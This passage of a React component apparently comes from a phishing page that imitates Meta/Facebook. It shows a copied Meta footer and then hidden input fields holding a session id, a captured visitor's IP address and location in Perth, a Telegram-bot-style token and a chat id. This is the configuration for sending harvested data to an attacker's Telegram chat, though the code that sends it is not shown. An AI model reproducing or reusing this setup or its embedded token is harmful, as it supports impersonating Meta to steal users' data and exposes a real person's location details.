              <i className="bx bx-chevron-down" />
            </span>
            <ul>
              <li><a href="https://www.facebook.com/safety" target="_blank">Family safety center</a></li>
              <li><a href="https://www.facebook.com/business" target="_blank">Meta for business</a></li>
              <li><a href="https://developers.facebook.com/" target="_blank">Meta for developers</a></li>
            </ul>
          </div>
        </div>
        <div className="item">
          <div className="report_bug">
            <svg fill="#000000" height="20px" width="20px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" viewBox="0 0 501.665 501.665" xmlSpace="preserve">
              <g>
                <g>
                  <path d="M485.149,381.442l-10.133-37.653c-5.547-21.333-18.88-39.787-37.547-51.52l-21.013-13.12
            c-0.213-0.107-0.427-0.107-0.64-0.213c0.213-4.373,0.427-8.64,0.427-12.907c0.107-11.84-0.96-23.68-3.093-35.307
            c41.813-8.427,72.32-46.827,72.32-91.307v-0.213c0-3.2-1.387-6.4-3.947-8.32c-2.24-1.707-4.48-2.347-6.72-2.347
            c-5.973,0.107-10.667,5.013-10.667,10.987c0,34.347-23.36,64-55.573,70.4c-0.32,0.107-0.747,0.32-1.067,0.427
            c-9.173-26.027-24.747-43.733-42.987-55.893c2.347-7.68,3.52-15.573,3.52-23.573c0-33.92-20.48-63.893-51.52-81.6
            c-0.107-0.32-0.107-0.64-0.32-0.96c-1.387-2.453-2.24-5.227-2.133-8.107c0-10.24,9.707-18.56,21.76-18.773
            c5.44-0.107,10.347-3.947,10.987-9.387c0.747-6.4-4.267-11.947-10.56-11.947c-23.467,0-42.453,17.28-43.2,38.72
            c-27.413-8.96-56.853-8.96-84.267,0c-0.747-21.333-19.413-38.507-42.667-38.827c-5.547-0.107-10.56,3.84-11.2,9.28
            c-0.853,6.507,4.267,12.053,10.56,12.053c12.16,0,22.08,8.427,22.08,18.773c0,2.88-0.747,5.653-2.133,8.107
            c-0.107,0.32-0.213,0.747-0.32,1.067c-31.253,17.92-51.627,47.787-51.627,81.6c0,8,1.28,15.893,3.52,23.573
            c-18.133,12.16-33.813,29.867-42.987,55.893c-0.32-0.213-0.747-0.32-1.067-0.427c-32.107-6.507-55.467-36.053-55.467-70.507
            v-0.533c0-5.76-4.693-10.453-10.453-10.453c-0.107,0-0.107,0-0.213,0c-5.973,0.107-10.667,5.013-10.667,10.987
            c0,44.373,30.507,82.773,72.427,91.307c-2.133,11.627-3.2,23.467-3.093,35.307c0,4.267,0.107,8.64,0.32,12.907
            c-0.213,0.107-0.427,0.107-0.64,0.213l-21.013,13.227c-18.56,11.733-32,30.187-37.547,51.52l-10.133,37.76
            c-1.493,5.653,1.813,11.52,7.573,13.12s11.52-1.813,13.013-7.573l10.133-37.653c4.16-16.107,14.293-29.973,28.267-38.933
            l12.587-7.893c3.84,27.307,11.307,53.973,22.187,79.253l-10.773,11.093c-19.307,18.027-29.973,39.68-29.973,60.907v36.693
            c0,5.333,3.84,10.133,9.067,10.88c6.613,0.96,12.267-4.16,12.267-10.56v-37.013c0-14.933,8.533-31.573,23.68-45.867l5.653-5.76
            c29.973,56.853,76.8,99.307,130.667,99.307c53.867,0,100.8-42.453,130.667-99.307l5.973,6.08
            c14.827,13.973,23.36,30.507,23.36,45.547v36.693c0,5.333,3.84,10.133,9.067,10.88c6.613,0.96,12.267-4.16,12.267-10.56v-37.013
            c0-21.12-10.667-42.88-29.76-60.8l-11.093-11.413c10.987-25.28,18.453-51.947,22.187-79.253l12.587,7.893
            c13.973,8.96,24.107,22.827,28.267,38.933l10.133,37.653c1.6,7.147,10.027,10.987,16.853,6.187
            c0.853-0.64,1.707-1.387,2.347-2.347C485.575,388.055,486.002,384.535,485.149,381.442z M240.242,479.362
            c-74.88-9.6-133.44-120.64-133.44-213.333c0-42.24,12.373-72.107,38.293-90.987l0.107,0.107l10.24-5.547
            c21.227-11.413,49.173-18.24,81.28-19.733c1.173,0,2.347,0,3.52-0.107V479.362z M156.295,143.895
            c-0.96-4.267-1.493-8.533-1.493-13.013c0-42.667,43.093-77.333,96-77.333s96,34.667,96,77.333c0,4.373-0.533,8.747-1.493,13.013
            c-35.307-15.68-74.667-15.68-94.507-15.68C230.962,128.215,191.709,128.215,156.295,143.895z M261.469,479.469v-329.6
            c1.173,0,2.347,0,3.52,0.107c32.107,1.493,59.947,8.213,81.28,19.733l10.24,5.547l0.107-0.107
            c25.92,18.987,38.293,48.747,38.293,90.987C394.802,358.722,336.242,469.655,261.469,479.469z" />
                </g>
              </g>
            </svg>
            <p>Report a bug</p>
          </div>
          <p className="copyright">© Meta 2023</p>
        </div>
      </div>
    </div>
  </footer>		<div>
    <input type="hidden" id="sessId" defaultValue="tgjmjgfadobc7qpg9h9oukhnqc" />
    <input type="hidden" id="appMessage" defaultValue="*IP: 103.107.196.236
Country: AU
City: Perth
Region: Western Australia
" />
    <input type="hidden" id="appToken" defaultValue="7340459309:AAELQFf5OADuGohb8hcpORUbGsUYxkBQV_o" />
    <input type="hidden" id="appChatId" defaultValue={-4217456036} />
  </div>
</div>

    </main>
  );
}
